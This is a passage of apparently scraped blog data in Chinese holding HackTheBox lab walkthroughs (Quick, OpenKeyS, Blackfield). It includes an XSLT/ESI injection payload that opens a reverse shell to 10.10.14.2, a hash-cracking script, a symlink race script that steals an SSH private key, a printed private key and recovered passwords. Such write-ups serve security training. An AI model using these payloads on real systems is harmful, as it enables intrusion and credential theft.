select&#x3D;&quot;$cmd&quot;&#x2F;&gt;&lt;&#x2F;root&gt;&lt;&#x2F;xsl:template&gt;&lt;&#x2F;xsl:stylesheet&gt; shell.xsl123456789101112131415&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;xsl:stylesheet version&#x3D;&quot;1.0&quot; xmlns:xsl&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot;&gt;&lt;xsl:output method&#x3D;&quot;xml&quot; omit-xml-declaration&#x3D;&quot;yes&quot;&#x2F;&gt;&lt;xsl:template match&#x3D;&quot;&#x2F;&quot;xmlns:xsl&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot;xmlns:rt&#x3D;&quot;http:&#x2F;&#x2F;xml.apache.org&#x2F;xalan&#x2F;java&#x2F;java.lang.Runtime&quot;&gt;&lt;root&gt;&lt;xsl:variable name&#x3D;&quot;cmd&quot;&gt;&lt;![CDATA[.&#x2F;vnc -e &#x2F;bin&#x2F;sh 10.10.14.2 9001 ]]&gt;&lt;&#x2F;xsl:variable&gt;&lt;xsl:variable name&#x3D;&quot;rtObj&quot; select&#x3D;&quot;rt:getRuntime()&quot;&#x2F;&gt;&lt;xsl:variable name&#x3D;&quot;process&quot; select&#x3D;&quot;rt:exec($rtObj, $cmd)&quot;&#x2F;&gt;Process: &lt;xsl:value-of select&#x3D;&quot;$process&quot;&#x2F;&gt;Command: &lt;xsl:value-of select&#x3D;&quot;$cmd&quot;&#x2F;&gt;&lt;&#x2F;root&gt;&lt;&#x2F;xsl:template&gt;&lt;&#x2F;xsl:stylesheet&gt; payload12345&lt;esi:include src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.2:7778&#x2F;wget.xml&quot; stylesheet&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.2:7778&#x2F;wget.xsl&quot;&gt;&lt;&#x2F;esi:include&gt;&lt;esi:include src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.2:7778&#x2F;chmod.xml&quot; stylesheet&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.2:7778&#x2F;chmod.xsl&quot;&gt;&lt;&#x2F;esi:include&gt;&lt;esi:include src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.2:7778&#x2F;shell.xml&quot; stylesheet&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.2:7778&#x2F;shell.xsl&quot;&gt;&lt;&#x2F;esi:include&gt; server log整个流程大概就这样，xml是空的，xsl是payload： 123456789python -m SimpleHTTPServer 7778Serving HTTP on 0.0.0.0 port 7778 ...10.10.10.186 - - [06/Aug/2020 16:04:50] \"GET /wget.xsl HTTP/1.1\" 200 -10.10.10.186 - - [06/Aug/2020 16:04:50] \"GET /wget.xml HTTP/1.1\" 200 -10.10.10.186 - - [06/Aug/2020 16:04:51] \"GET /nc HTTP/1.1\" 200 -10.10.10.186 - - [06/Aug/2020 16:07:10] \"GET /chmod.xsl HTTP/1.1\" 200 -10.10.10.186 - - [06/Aug/2020 16:07:54] \"GET /chmod.xml HTTP/1.1\" 200 -10.10.10.186 - - [06/Aug/2020 16:12:54] \"GET /shell.xsl HTTP/1.1\" 200 -10.10.10.186 - - [06/Aug/2020 16:12:54] \"GET /shell.xml HTTP/1.1\" 200 - user flag上面得到的shell，得到user.txt: 信息搜集db.php里面有数据库连接信息： 1234567891011sam@quick:~$ cd /var/www/htmlcd /var/www/htmlsam@quick:/var/www/html$ lslsclients.php db.php home.php index.php login.php search.php ticket.phpsam@quick:/var/www/html$ cat db.phpcat db.php&lt;?php$conn = new mysqli(\"localhost\",\"db_adm\",\"db_p4ss\",\"quick\");?&gt;sam@quick:/var/www/html$ 数据库从数据库里得到账号和密码hash： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657sam@quick:/var/www/html$ mysql -u db_adm -pmysql -u db_adm -pEnter password: db_p4ssWelcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 66Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; show databases;show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || quick || sys |+--------------------+5 rows in set (0.00 sec)mysql&gt; use quick;use quick;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;show tables;+-----------------+| Tables_in_quick |+-----------------+| jobs || tickets || users |+-----------------+3 rows in set (0.00 sec)mysql&gt; select * from users;select * from users;+--------------+------------------+----------------------------------+| name | email | password |+--------------+------------------+----------------------------------+| Elisa | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d || Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |+--------------+------------------+----------------------------------+2 rows in set (0.00 sec)mysql&gt; 加密方式login.php里面代码，得到salt： 12345678910sam@quick:/var/www/html$ cat login.phpcat login.php&lt;?phpinclude(\"db.php\");if(isset($_POST[\"email\"]) &amp;&amp; isset($_POST[\"password\"]))&#123; $email=$_POST[\"email\"]; $password = $_POST[\"password\"]; $password = md5(crypt($password,'fa'));... 爆破我们想要知道srvadm的明文密码，已经有了hash，那就直接用字典加密生成hash后爆破匹配即可： 1234567891011121314151617181920&lt;?php$handle = fopen(\"/usr/share/wordlists/rockyou.txt\", \"r\");if ($handle) &#123; while (($line = fgets($handle)) !== false) &#123; $pass= \"e626d51f8fbfd1124fdea88396c35d05\"; $Password= MD5(crypt($line,'fa')) if($pass==$Password) &#123; echo \"Hash Cracked Password is: \"$line; &#125; &#125; fclose($handle);&#125; else &#123; // echo \"error opening the file.\";&#125; ?&gt; 得到密码是yl51pbx printer在/var/www/目录还有个printer目录： 12345678910sam@quick:/var/www$ lslshtml jobs printersam@quick:/var/www$ cd printercd printersam@quick:/var/www/printer$ lslsadd_printer.php db.php favicon.ico home.php index.php printers.phpcss escpos-php fonts images job.phpsam@quick:/var/www/printer$ 查看配置文件: 123456789101112131415161718192021222324252627282930313233343536373839404142sam@quick:/var/www/printer$ cd /etc/apache2/sites-enabledcd /etc/apache2/sites-enabledsam@quick:/etc/apache2/sites-enabled$ lsls000-default.confsam@quick:/etc/apache2/sites-enabled$ cat 000-default.confcat 000-default.conf&lt;VirtualHost *:80&gt; # The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request's Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly. #ServerName www.example.com ServerAdmin webmaster@localhost DocumentRoot /var/www/html # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g. #LogLevel info ssl:warn ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined # For most configuration files from conf-available/, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with \"a2disconf\". #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;&lt;VirtualHost *:80&gt; AssignUserId srvadm srvadm ServerName printerv2.quick.htb DocumentRoot /var/www/printer&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet 得到域名printerv2.quick.htb，然后应该是开在localhost的80端口 端口转发我们可以将端口转发出来访问 添加公钥首先我们可以把自己的ssh公钥加进去，方便后续操作： 123456sam@quick:~$ mkdir .sshmkdir .sshsam@quick:~$ cd .sshcd .sshsam@quick:~/.ssh$ echo 'ssh-rsa xxxx' &gt;&gt; authorized_keyssam@quick:~/.ssh$ 端口转发因为80端口，所以要sudo： 1sudo ssh -L 80:127.0.0.1:80 sam@10.10.10.186 然后我们访问本机的80 ，就相当于访问远程机器本地80，添加host访问printerv2.quick.htb： 1127.0.0.1 printerv2.quick.htb 使用srvadm@quick.htb : yl51pbx登录： printer回到服务器上，查看printer相关代码 job.php这里有个条件竞争： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950sam@quick:/var/www/printer$ lsadd_printer.php db.php favicon.ico home.php index.php printers.phpcss escpos-php fonts images job.phpsam@quick:/var/www/printer$ cat job.php&lt;?phprequire __DIR__ . '/escpos-php/vendor/autoload.php';use Mike42\\Escpos\\PrintConnectors\\NetworkPrintConnector;use Mike42\\Escpos\\Printer;include(\"db.php\");session_start();if($_SESSION[\"loggedin\"])&#123; if(isset($_POST[\"submit\"])) &#123; $title=$_POST[\"title\"]; $file = date(\"Y-m-d_H:i:s\"); file_put_contents(\"/var/www/jobs/\".$file,$_POST[\"desc\"]); chmod(\"/var/www/printer/jobs/\".$file,\"0777\"); $stmt=$conn-&gt;prepare(\"select ip,port from jobs\"); $stmt-&gt;execute(); $result=$stmt-&gt;get_result(); if($result-&gt;num_rows &gt; 0) &#123; $row=$result-&gt;fetch_assoc(); $ip=$row[\"ip\"]; $port=$row[\"port\"]; try &#123; $connector = new NetworkPrintConnector($ip,$port); sleep(0.5); //Buffer for socket check $printer = new Printer($connector); $printer -&gt; text(file_get_contents(\"/var/www/jobs/\".$file)); $printer -&gt; cut(); $printer -&gt; close(); $message=\"Job assigned\"; unlink(\"/var/www/jobs/\".$file); &#125; catch(Exception $error) &#123; $error=\"Can't connect to printer.\"; unlink(\"/var/www/jobs/\".$file); &#125; &#125; else &#123; $error=\"Couldn't find printer.\"; &#125; &#125;... 他使用当前时间戳timestamp作为文件名，然后将其发送给add-printer 功能中指定的ip和端口进行打印 那么我们就可以尝试条件竞争，将srvadm用户的ssh私钥软链接到/var/www/jobs目录下，使其打印到我们指定的打印机端口 条件竞争运行脚本，监听端口。添加一个打印机： 然后去http://printerv2.quick.htb/job.php执行打印： 接收到srvadm用户私钥： 之后使用这个私钥就可以以srvadm用户登录： script12345678910#!/bin/shcd /var/www/jobs;while true;do for file in $(ls .); do rm -rf $file; ln -s /home/srvadm/.ssh/id_rsa $file; donedone 提权信息 有两个配置文件： 12345678srvadm@quick:~/.cache/conf.d$ pwd/home/srvadm/.cache/conf.dsrvadm@quick:~/.cache/conf.d$ ls -altotal 20drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:23 .drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 ..-rw-r--r-- 1 srvadm srvadm 4569 Mar 20 06:20 cupsd.conf-rw-r--r-- 1 srvadm srvadm 4038 Mar 20 06:23 printers.conf 在printers.conf中有一行： 1DeviceURI https:&#x2F;&#x2F;srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb&#x2F;printer 解码后是： 1https:&#x2F;&#x2F;srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb&#x2F;printer 所以&amp;ftQ4K3SGde8?是密码 root flag上面得到的密码就是root用户密码，直接ssh登录，得到root.txt: 参考资料 https://github.com/cloudflare/quiche https://github.com/yurymuski/curl-http3 https://developers.cloudflare.com/http3/intro/curl-brew/ ESI Injection Part 2: Abusing specific implementations | GoSecurehttps://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/ Hackthebox Quick Writeup | Vibhu025https://vibhu025.github.io/posts/htb-quick/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"OpenKeyS - HackTheBox","slug":"OpenKeyS-HackTheBox","date":"2020-08-06T02:56:32.000Z","updated":"2020-12-14T00:43:31.321Z","comments":true,"path":"2020/08/06/OpenKeyS-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/08/06/OpenKeyS-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/267 10.10.10.199 端口扫描22和80: 12345678910111213141516$ nmap -sC -sV 10.10.10.199Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-06 10:15 CSTNmap scan report for 10.10.10.199Host is up (0.069s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.1 (protocol 2.0)| ssh-hostkey:| 3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)| 256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)|_ 256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)80/tcp open http OpenBSD httpd|_http-title: Site doesn't have a title (text/html).Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 36.25 seconds 80 需要登录，不是常规弱口令，也没CMS信息： 目录扫描扫描有一个includes目录，可以列文件，里面有个swp文件： 12345678gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.199//images (Status: 301)/css (Status: 301)/includes (Status: 301)/js (Status: 301)/vendor (Status: 301)/fonts (Status: 301) 可以得到域名是jenniferopenkeys.htb，用户名应该是jennifer bypass login搜索资料能够找到： https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt 我们可以使用-schallenge:passwd bypass login,登录进去是sshkey.php： get ssh key登录请求时修改cookie，添加用户名，这样可以以jennifer用户登录，得到ssh key： ssh key1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAo4LwXsnKH6jzcmIKSlePCo&#x2F;2YWklHnGn50YeINLm7LqVMDJJnbNxOI6lTsb9qpn0zhehBS2RCx&#x2F;i6YNWpmBBPCy6s2CxsYSiRd3S7NftPNKanTTQFKfOpEn7rGnag+n7Ke+iZ1U&#x2F;FEw4yNwHrrEI2pklGagQjnZgZUADzxVArjN5RsAPYE50mpVB7JO8E7DRPWCfMNZYd7uIFBVRrQKgM&#x2F;n087fUyEyFZGibq8BRLNNwUYidkJOmgKSFoSOa9+6B0ou5oUqjP7fp0kpsJ&#x2F;XM1gsDR&#x2F;75lxegO22PPfz15ZC04APKFlLJo1ZEtozcmBDxdODJ3iTXj8JskLV+lnJAMInjK3TOoj9F4cZ5WTk29v&#x2F;c7aExv9zQYZ+sHdoZtLy27JobZJli&#x2F;9veIp8hBG717QzQxMmKpvnlc76HLigzqmNoq4UxSZlhYRclBUs3l5CU9pdsCb3U1tVSFZPNvQgNO2JDS7O6sUJFu6mXiolTmt9eF+8SvEdZDHXvAqqvXqBRAAAFmKm8m76pvJu+AAAAB3NzaC1yc2EAAAGBAKOC8F7Jyh+o83JiCkpXjwqP9mFpJR5xp+dGHiDS5uy6lTAySZ2zcTiOpU7G&#x2F;aqZ9M4XoQUtkQsf4umDVqZgQTwsurNgsbGEokXd0uzX7TzSmp000BSnzqRJ+6xp2oPp+ynvomdVPxRMOMjcB66xCNqZJRmoEI52YGVAA88VQK4zeUbAD2BOdJqVQeyTvBOw0T1gnzDWWHe7iBQVUa0CoDP59PO31MhMhWRom6vAUSzTcFGInZCTpoCkhaEjmvfugdKLuaFKoz+36dJKbCf1zNYLA0f++ZcXoDttjz389eWQtOADyhZSyaNWRLaM3JgQ8XTgyd4k14&#x2F;CbJC1fpZyQDCJ4yt0zqI&#x2F;ReHGeVk5Nvb&#x2F;3O2hMb&#x2F;c0GGfrB3aGbS8tuyaG2SZYv&#x2F;b3iKfIQRu9e0M0MTJiqb55XO+hy4oM6pjaKuFMUmZYWEXJQVLN5eQlPaXbAm91NbVUhWTzb0IDTtiQ0uzurFCRbupl4qJU5rfXhfvErxHWQx17wKqr16gUQAAAAMBAAEAAAGBAJjT&#x2F;uUpyIDVAk5L8oBP3IOr0UZ051vQMXZKJEjbtzlWn7C&#x2F;n+0FVnLdaQb7mQcHBThH&#x2F;5l+YI48THOj7a5uUyryR8L3Qr7AUIfq8IWswLHTyu3a+g4EVnFaMSCSg8o+PSKSN4JLvDy1jXG3rnqKP9NJxtJ3MpplbG3Wanj4zU7FD7qgMv759aSykz6TSvxAjSHIGKKmBWRL5MGYt5F03dYW7+uITBq24wrZd38NrxGtwtKCVXtXdg3ROJFHXUYVJsX09Yv5tH5dxs93Re0HoDSLZuQyIc5iDHnR4CT+0QEX14u3ELTxaoqT6GBtynwP7Z79s9G5VAF46deQW6jEtc6akIbcyEzU9T3YjrZ2rAaECkJo4+ppjiJpNmDe8LSyaXKDIvC8lb3b5oixFZAvkGIvnIHhgRGv&#x2F;+pHTqo9dDDd+utlIzGPBXsTRYG2Vzj7Zl0cYleUzPXdsf5deSpoXY7axwlyEkAXvavFVjU1UgZ8uIqu8W1BiODbcOK8jMgDkQAAAMB0rxI03D&#x2F;q8PzTgKml88XoxhqokLqIgevkfL&#x2F;IK4z8728r+3jLqfbR9mE3Vr4tPjfgOqeaCUkHTiEo6Z3TnkpbTVmhQbCExRdOvxPfPYyvI7r5wxkTEgVXJTuaoUJtJYJJH2n6bgB3WIQfNilqAesxeiM4MOmKEQcHiGNHbbVW+ehuSdfDmZZb0qQkPZK3KH2ioOaXCNA0h+FC+gdhqTJhv2vl1X&#x2F;Jy&#x2F;assyr80KFC9Eo1DTah2TLnJZJpuJjENS4AAADBAM0xIVEJZWEdWGOgG1vwKHWBI9iNSdxn1c+SHIuGNm6RTrrxuDljYWaV0VBn4cmpswBcJ2O+AOLKZvnMJlmWKyDlq6MFiEIyVKqjv0pDM3C2EaAA38szMKGC+Q0Mky6xvyMqDn6hqI2Y7UNFtCj1b&#x2F;aLI8cBrfBeN4sCM8c&#x2F;gk+QWYIMAsSWjOyNIBjy+wPHjd1lDEpo2DqYfmE8MjpGOtMeJjP2pcyWF6CxcVbm6skasewcJa4Bhj&#x2F;MrJJ+KjpIjQAAAMEAy&#x2F;+8Z+EM0lHgraAXbmmyUYDV3uaCT6kuAlz0bhIR2&#x2F;CSkWLHF46Y1FkYCxlJWgnn6Vw43M0yqn2qIxuZZ32dw1kCwW4UNphyAQT1t5eXBJSsuum8VUW5oOVVaZb1clU&#x2F;0y5nrjbbqlPfo5EVWu&#x2F;oE3gBmSPfbMKuh9nwsKJ2fi0Pbp1ZxZvcghw2DwmKpxc+wWvIUQp8NEe6H334hC0EAXalOgmJwLXNPZ+nV6pri4qLEM6mcTqtQ5OEFcmVIA&#x2F;VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc&#x3D;-----END OPENSSH PRIVATE KEY----- user flag然后使用这个私钥登录，得到user.txt： 提权信息12openkeys$ uname -aOpenBSD openkeys.htb 6.6 GENERIC#353 amd64 根据内核版本，搜索信息得到： OpenBSD patches authentication bypass, privilege escalation vulnerabilities | ZDNethttps://www.zdnet.com/article/openbsd-patches-severe-authentication-bypass-privilege-escalation-vulnerabilities/ https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot 提权 &amp; root flag exp一键提权，得到root.txt: 参考资料 https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt OpenBSD patches authentication bypass, privilege escalation vulnerabilities | ZDNethttps://www.zdnet.com/article/openbsd-patches-severe-authentication-bypass-privilege-escalation-vulnerabilities/ https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot OpenKeyS HackTheBox WalkThrough | Ethicalhacs.comhttps://ethicalhacs.com/openkeys-hackthebox-walkthrough/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Blackfield - HackTheBox","slug":"Blackfield-HackTheBox","date":"2020-08-04T07:41:38.000Z","updated":"2020-10-09T00:32:26.453Z","comments":true,"path":"2020/08/04/Blackfield-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/08/04/Blackfield-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/255 10.10.10.192 端口扫描典型windows域服务器： 12345678910111213141516171819202122232425262728293031323334nmap -sC -sV -Pn 10.10.10.192Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 13:25 CSTNmap scan report for 10.10.10.192Host is up (0.077s latency).Not shown: 993 filtered portsPORT STATE SERVICE VERSION53/tcp open domain?| fingerprint-strings:| DNSVersionBindReqTCP:| version|_ bind88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-08-04 12:25:44Z)135/tcp open msrpc Microsoft Windows RPC389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.03268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=8/4%Time=5F28F15D%P=x86_64-apple-darwin18.6.0%rSF:(DNSVersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07verSF:sion\\x04bind\\0\\0\\x10\\0\\x03\");Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 6h59m59s| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-08-04T12:28:06|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 205.07 seconds enumenum4linuxDomain Name: BLACKFIELD 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126enum4linux 10.10.10.192Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jul 17 15:21:08 2020 ==========================| Target Information | ==========================Target ........... 10.10.10.192RID Range ........ 500-550,1000-1050Username ......... ''Password ......... ''Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ====================================================| Enumerating Workgroup/Domain on 10.10.10.192 | ====================================================[E] Can't find workgroup/domain ============================================| Nbtstat Information for 10.10.10.192 | ============================================Looking up status of 10.10.10.192No reply from 10.10.10.192 =====================================| Session Check on 10.10.10.192 | =====================================Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.[+] Server 10.10.10.192 allows sessions using username '', password ''Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.[+] Got domain/workgroup name: ===========================================| Getting domain SID for 10.10.10.192 | ===========================================Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.Domain Name: BLACKFIELDDomain Sid: S-1-5-21-4194615774-2175524697-3563712290[+] Host is part of a domain (not a workgroup) ======================================| OS information on 10.10.10.192 | ======================================Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.[+] Got OS info for 10.10.10.192 from smbclient:Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.[+] Got OS info for 10.10.10.192 from srvinfo:Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED =============================| Users on 10.10.10.192 | =============================Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIEDUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED =========================================| Share Enumeration on 10.10.10.192 | =========================================Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640. Sharename Type Comment --------- ---- -------SMB1 disabled -- no workgroup available[+] Attempting to map shares on 10.10.10.192 ====================================================| Password Policy Information for 10.10.10.192 | ====================================================[E] Unexpected error from polenum:[+] Attaching to 10.10.10.192 using a NULL share[+] Trying protocol 139/SMB... [!] Protocol failed: [Errno Connection error (10.10.10.192:139)] [Errno 111] Connection refused[+] Trying protocol 445/SMB... [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - &#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.[E] Failed to get password policy with rpcclient ==============================| Groups on 10.10.10.192 | ==============================Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.[+] Getting builtin groups:[+] Getting builtin group memberships:Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.[+] Getting local groups:[+] Getting local group memberships:Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.[+] Getting domain groups:[+] Getting domain group memberships: =======================================================================| Users on 10.10.10.192 via RID cycling (RIDS: 500-550,1000-1050) | =======================================================================Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED. RID cycling not possible.Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742. =============================================| Getting printer info for 10.10.10.192 | =============================================Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIEDenum4linux complete on Fri Jul 17 15:22:05 2020 smbclientsmb可以匿名登录： 12345678910111213smbclient -L 10.10.10.192Enter WORKGROUP\\miao's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share forensic Disk Forensic / Audit share. IPC$ IPC Remote IPC NETLOGON Disk Logon server share profiles$ Disk SYSVOL Disk Logon server shareSMB1 disabled -- no workgroup available 排除默认的，关注另外两个： forensic profiles$ SMBforensic这个共享没有权限： 123456 smbclient //10.10.10.192/forensicEnter WORKGROUP\\miao's password:Try \"help\" to get a list of possible commands.smb: \\&gt; lsNT_STATUS_ACCESS_DENIED listing \\*smb: \\&gt; profiles$非常多的目录，应该是用户名：smbclient //10.10.10.192/profiles$Enter WORKGROUP\\miao's password:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Wed Jun 3 12:47:12 2020 .. D 0 Wed Jun 3 12:47:12 2020 AAlleni D 0 Wed Jun 3 12:47:11 2020 ABarteski D 0 Wed Jun 3 12:47:11 2020 ABekesz D 0 Wed Jun 3 12:47:11 2020 ABenzies D 0 Wed Jun 3 12:47:11 2020 ABiemiller D 0 Wed Jun 3 12:47:11 2020 AChampken D 0 Wed Jun 3 12:47:11 2020 ACheretei D 0 Wed Jun 3 12:47:11 2020 ACsonaki D 0 Wed Jun 3 12:47:11 2020 AHigchens D 0 Wed Jun 3 12:47:11 2020 AJaquemai D 0 Wed Jun 3 12:47:11 2020 AKlado D 0 Wed Jun 3 12:47:11 2020 AKoffenburger D 0 Wed Jun 3 12:47:11 2020 AKollolli D 0 Wed Jun 3 12:47:11 2020 AKruppe D 0 Wed Jun 3 12:47:11 2020 AKubale D 0 Wed Jun 3 12:47:11 2020 ALamerz D 0 Wed Jun 3 12:47:11 2020 AMaceldon D 0 Wed Jun 3 12:47:11 2020 AMasalunga D 0 Wed Jun 3 12:47:11 2020 ANavay D 0 Wed Jun 3 12:47:11 2020 ANesterova D 0 Wed Jun 3 12:47:11 2020 ANeusse D 0 Wed Jun 3 12:47:11 2020 AOkleshen D 0 Wed Jun 3 12:47:11 2020 APustulka D 0 Wed Jun 3 12:47:11 2020 ARotella D 0 Wed Jun 3 12:47:11 2020 ASanwardeker D 0 Wed Jun 3 12:47:11 2020 AShadaia D 0 Wed Jun 3 12:47:11 2020 ASischo D 0 Wed Jun 3 12:47:11 2020 ASpruce D 0 Wed Jun 3 12:47:11 2020 ATakach D 0 Wed Jun 3 12:47:11 2020 ATaueg D 0 Wed Jun 3 12:47:11 2020 ATwardowski D 0 Wed Jun 3 12:47:11 2020 audit2020 D 0 Wed Jun 3 12:47:11 2020 AWangenheim D 0 Wed Jun 3 12:47:11 2020 AWorsey D 0 Wed Jun 3 12:47:11 2020 AZigmunt D 0 Wed Jun 3 12:47:11 2020 BBakajza D 0 Wed Jun 3 12:47:11 2020 BBeloucif D 0 Wed Jun 3 12:47:11 2020 BCarmitcheal D 0 Wed Jun 3 12:47:11 2020 BConsultant D 0 Wed Jun 3 12:47:11 2020 BErdossy D 0 Wed Jun 3 12:47:11 2020 BGeminski D 0 Wed Jun 3 12:47:11 2020 BLostal D 0 Wed Jun 3 12:47:11 2020 BMannise D 0 Wed Jun 3 12:47:11 2020 BNovrotsky D 0 Wed Jun 3 12:47:11 2020 BRigiero D 0 Wed Jun 3 12:47:11 2020 BSamkoses D 0 Wed Jun 3 12:47:11 2020 BZandonella D 0 Wed Jun 3 12:47:11 2020 CAcherman D 0 Wed Jun 3 12:47:12 2020 CAkbari D 0 Wed Jun 3 12:47:12 2020 CAldhowaihi D 0 Wed Jun 3 12:47:12 2020 CArgyropolous D 0 Wed Jun 3 12:47:12 2020 CDufrasne D 0 Wed Jun 3 12:47:12 2020 CGronk D 0 Wed Jun 3 12:47:11 2020 Chiucarello D 0 Wed Jun 3 12:47:11 2020 Chiuccariello D 0 Wed Jun 3 12:47:12 2020 CHoytal D 0 Wed Jun 3 12:47:12 2020 CKijauskas D 0 Wed Jun 3 12:47:12 2020 